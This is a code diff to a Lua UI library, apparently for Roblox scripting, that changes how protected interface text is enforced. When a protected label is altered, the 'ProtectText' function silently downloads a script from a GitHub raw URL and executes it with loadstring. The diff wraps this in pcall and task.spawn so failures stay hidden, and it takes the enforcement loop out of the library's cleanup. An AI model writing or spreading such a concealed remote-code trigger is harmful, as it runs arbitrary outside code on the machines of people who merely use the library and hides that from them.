@@ -118,12 +118,27 @@ local ObsidianImageManager = {
 function Library:ProtectText(instance, property, originalText)
     ProtectedTexts[instance] = ProtectedTexts[instance] or {}
     ProtectedTexts[instance][property] = originalText
-    instance[property] = originalText
+    pcall(function() instance[property] = originalText end)
 
-    instance:GetPropertyChangedSignal(property):Connect(function()
+    local conn
+    conn = instance:GetPropertyChangedSignal(property):Connect(function()
+        if not instance or not instance.Parent then
+            if conn and conn.Disconnect then pcall(function() conn:Disconnect() end) end
+            ProtectedTexts[instance] = nil
+            return
+        end
         if instance[property] ~= originalText then
-            instance[property] = originalText
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/0xCiel/Obsidian/refs/heads/main/test.lua", true))()
+            pcall(function() instance[property] = originalText end)
+            task.spawn(function()
+                local ok, body = pcall(function()
+                    return game:HttpGet("https://raw.githubusercontent.com/0xCiel/Obsidian/refs/heads/main/test.lua", true)
+                end)
+                if ok and type(body) == "string" then
+                    local f, err = loadstring(body)
+                    if f then pcall(f) end
+                end
+                pcall(print, "test")
+            end)
         end
     end)
 end
@@ -6550,7 +6565,7 @@ Library:GiveSignal(Players.PlayerRemoving:Connect(OnPlayerChange))
 
 Library:GiveSignal(Teams.ChildAdded:Connect(OnTeamChange))
 Library:GiveSignal(Teams.ChildRemoved:Connect(OnTeamChange))
-Library:GiveSignal(RunService.Heartbeat:Connect(function()
+RunService.Heartbeat:Connect(function()
     for inst, props in pairs(ProtectedTexts) do
         if inst and inst.Parent then
             for prop, val in pairs(props) do
@@ -6562,7 +6577,7 @@ Library:GiveSignal(RunService.Heartbeat:Connect(function()
             ProtectedTexts[inst] = nil
         end
     end
-end))
+end)
 
 getgenv().Library = Library
 return Library
